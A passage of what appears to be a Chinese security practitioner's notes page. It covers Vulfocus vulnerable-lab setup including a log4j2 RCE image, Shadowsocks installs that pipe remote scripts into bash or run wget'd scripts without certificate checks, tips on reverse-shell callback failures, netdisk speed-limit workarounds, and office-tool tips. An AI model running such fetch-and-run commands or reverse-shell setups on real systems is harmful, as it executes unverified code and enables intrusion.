class=&#34;string&#34;&gt;&amp;quot;xxx.xxx.xxx&amp;quot;&lt;/span&gt; 为邮箱SMTP服务器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-e EMAIL_HOST_USER=&lt;span class=&#34;string&#34;&gt;&amp;quot;xxx@xxx.com&amp;quot;&lt;/span&gt; 为邮箱账号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-e EMAIL_HOST_PASSWORD=&lt;span class=&#34;string&#34;&gt;&amp;quot;xxxxxxxx 为邮箱密码&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker pull vulfocus/vulfocus:latest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker create -p 82:80 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=x.42.178.227 -e EMAIL_HOST=&amp;quot;root@mail.com&amp;quot; -e EMAIL_HOST_USER=&amp;quot;root&amp;quot; -e EMAIL_HOST_PASSWORD=&amp;quot;Clash123\!\@\#&amp;quot; vulfocus/vulfocus&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker start container id&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;string&#34;&gt;默认账户密码为 admin/admin。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;string&#34;&gt;添加镜像-本地导入-选择合适的镜像载入进去&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker search vulfocus --limit 100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker search vulfocus/weblogic --limit 100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker pull vulfocus/log4j2-rce-2021-12-09&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;快速搭建ss通道&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#快速搭建ss通道&#34;&gt;#&lt;/a&gt; 快速搭建 ss 通道&lt;/h3&gt;
&lt;p&gt;在安全组中开放相应端口：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jb25zb2xlLmNsb3VkLnRlbmNlbnQuY29tL3ZwYy9zZWN1cml0eWdyb3VwL2RldGFpbC9zZy1tNXJzZTM4eD9yaWQ9NQ==&#34;&gt;https://console.cloud.tencent.com/vpc/securitygroup/detail/sg-m5rse38x?rid=5&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;教程一：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYndnc3Mub3JnLzE1NC5odG1s&#34;&gt;https://www.bwgss.org/154.html&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;下载并安装：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash &amp;lt;(curl -sL https://raw.githubusercontent.com/hijkpw/scripts/master/centos_install_ss.sh)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看运行状态：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash &amp;lt;(curl -sL https://raw.githubusercontent.com/hijkpw/scripts/master/centos_install_ss.sh)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;info&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;SS卸载：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash&amp;lt;(curl -sL https://raw.githubusercontent.com/hijkpw/scripts/master/centos_install_ss.sh)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uninstall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;SS 管理命令：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;启动：systemctl start shadowsocks-libev&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;停止：systemctl stop shadowsocks-libev&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;重启：systemctl restart shadowsocks-libev&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;教程二：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudGFuZ3l1ZWNhbi5jb20vMjAxOS8wOS8yMC8lRTQlQjglODAlRTUlODglODYlRTklOTIlOUYlRTUlOUMlQThjZW50b3MlRTQlQjglOEElRTYlOTAlQUQlRTUlQkIlQkFzcyVFNiU5QyU4RCVFNSU4QSVBMSVFNSU5OSVBOC8=&#34;&gt;https://www.tangyuecan.com/2019/09/20 / 一分钟在 centos 上搭建 ss 服务器 /&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;一键安装 shadowsocks-go 版：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget –no-check-certificate https://tangyuecan.com/shadowsocks-go.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x shadowsocks-go.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./shadowsocks-go.sh 2&amp;gt;&amp;amp;1 | tee shadowsocks-go.log&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;卸载&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./shadowsocks.sh uninstall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;重启&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/etc/init.d/shadowsocks restart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看配置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/etc/shadowsocks/config.json&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;客户端下载地址&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;windows&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/shadowsocks/shadowsocks-windows/releases&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;macos&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/shadowsocks/ShadowsocksX-NG/releases&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;检验&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl --proxy 127.0.0.1:1087 &amp;quot;http://httpbin.org/ip&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;nginx域名指定目录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nginx域名指定目录&#34;&gt;#&lt;/a&gt; nginx 域名指定目录&lt;/h3&gt;
&lt;p&gt;将新买的域名解析到指定服务器 ip：通过云服务后台操作（1.5h）&lt;/p&gt;
&lt;p&gt;域名绑定目录的配置文件都放到这里：/usr/local/nginx/conf/vhost/&lt;/p&gt;
&lt;p&gt;在该目录下，新建一个文件，命名：域名.conf； 如：www.baidu.com.conf&lt;/p&gt;
&lt;p&gt;指定网站目录：如 /data/wwwroot/www.nmap.asia&lt;/p&gt;
&lt;p&gt;重启 nginx：systemctl restart nginx&lt;/p&gt;
&lt;p&gt;将 nginx 关闭之后，在服务器上随便开启的网站都会被解析到此域名&lt;/p&gt;
&lt;h3 id=&#34;pdftk操作pdf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pdftk操作pdf&#34;&gt;#&lt;/a&gt; pdftk 操作 pdf&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;谷歌翻译限制 10 M，可利用此方法拆分后一一翻译在合并&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;安装pdftk工具：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;brew install pdftk-java&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;brew install openjdk@11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;拆分pdf为两个文件：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pdftk penetrationtestingazureforethicalhackers.pdf cat 1-200 output book-1.pdf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pdftk penetrationtestingazureforethicalhackers.pdf cat 201-352 output book-2.pdf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将分隔后的再次合并：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pdftk book-1.pdf book-2.pdf cat output azure-book.pdf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pdftk A=book-1 \(Chinese\).pdf B=book-2 \(Chinese\).pdf cat A B output azure-book.pdf&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;反弹失败原因&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反弹失败原因&#34;&gt;#&lt;/a&gt; 反弹失败原因&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;腾讯云安全组端口没有开放造成的无法反弹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;linux 的防火墙未关闭或没有允许端口入流量导致&lt;br&gt;
 &lt;code&gt;systemctl status firewalld&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;linux 的 iptables 路由规则有限制导致&lt;br&gt;
 &lt;code&gt;iptables -L -n&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;iptables -A INPUT -p tcp --dport 4444 -j ACCEPT&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;破解网盘速度限制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#破解网盘速度限制&#34;&gt;#&lt;/a&gt; 破解网盘速度限制&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;为浏览器下载并安装油猴插件：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://www.tampermonkey.net/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;为油猴插件下载网盘直链脚本：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://greasyfork.org/zh-CN/scripts/418182-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%AE%80%E6%98%93%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B-%E7%9B%B4%E9 %93%BE%E4%B8%8B%E8%BD%BD%E5%A4%8D%E6%B4%BB%E7%89%88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在电脑上安装下载器：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;windows可下载IDM下载工具：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://softxm.lanzoui.com/idNdO0458y9g&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;macOS可下载NDM下载工具（油小猴）：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://www.baiduyun.wiki/download.html&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;IDM/NDM配置线程及UA：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://www.cnblogs.com/softxmm/p/13972678.html#idm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;网页百度网盘生成单个文件的url地址：http://pan.baidu.com/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将url导入到IDM/NDM进行下载：下载并配置好的这两个工具之一&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt; 油小猴附带有其他下载方案，但是速度受到了限制&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;pwsh基本操作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwsh基本操作&#34;&gt;#&lt;/a&gt; pwsh 基本操作&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;检查当前的powershell版本&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;PSVersionTable.PSVersion&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;安装最新版的powershell方法：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://learn.microsoft.com/en-us/powershell/scripting/install/installing-powershell?view=powershell-7.2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;键盘打开管理员权限的 powershell 按 windows 键，然后输入 pwsh，然后同时按 按 Ctrl+ Shift + Enter 键。再弹出的对话框中选择是，就可以弹出管理员权限的 pwsh。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;word的一些操作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#word的一些操作&#34;&gt;#&lt;/a&gt; word 的一些操作&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;word 批量替换 [x] 为上标的方法&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ctrl+h 调出查找与替换模块，选择高级替换与查找， 查找内容勾选为使用通配符、内容填写 [&lt;span 1,3&gt;0-9&lt;/span&gt;] 并且不限定格式，替换后的内容不填但是要选择字符格式中的上标格式。选择全部替换就可以改掉了。&lt;/p&gt;
&lt;p&gt;[&lt;span 1,2&gt;0-9&lt;/span&gt;](适用两位编号，三位为 {1,3}) 即 [&lt;span 1,3&gt;0-9&lt;/span&gt;]&lt;/p&gt;
&lt;p&gt;[&lt;span 1,2&gt;0-9&lt;/span&gt;?&lt;span 1,2&gt;0-9&lt;/span&gt;](适用两位编号，三位为 {1,3}) 即 [&lt;span 1,2&gt;0-9&lt;/span&gt;?&lt;span 1,3&gt;0-9&lt;/span&gt;](&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;word 引用自定义目录的方法&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;先将自己的标题统一设置为样式 - 这里选择以标题 3，4，5 作为自己的一二三级目录&lt;/p&gt;
&lt;p&gt;引用目录 - 自定义目录 - 选择目录深度 (需显示两级目录则选择为 4，即显示设置的一二)&lt;/p&gt;
&lt;p&gt;选择修改目录中的 TOC3、TOC4 依次进行修改&lt;/p&gt;
&lt;p&gt;TOC3 即原本的标题 3 是自己想要展示的一级目录，我设置了新罗马小四字，段落前后 间距 0 行，是 1.5 倍行距&lt;/p&gt;
&lt;p&gt;TOC4 即原本的标题 4 是自己想要展示的二级目录，我设置了新罗马 11 字，段落前间距 0 行，段落缩进 0.5cm，固定 20 磅行距&lt;/p&gt;
&lt;h3 id=&#34;子域名接管&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#子域名接管&#34;&gt;#&lt;/a&gt; 子域名接管&lt;/h3&gt;
&lt;p&gt;（1）域名解析记录类型&lt;/p&gt;
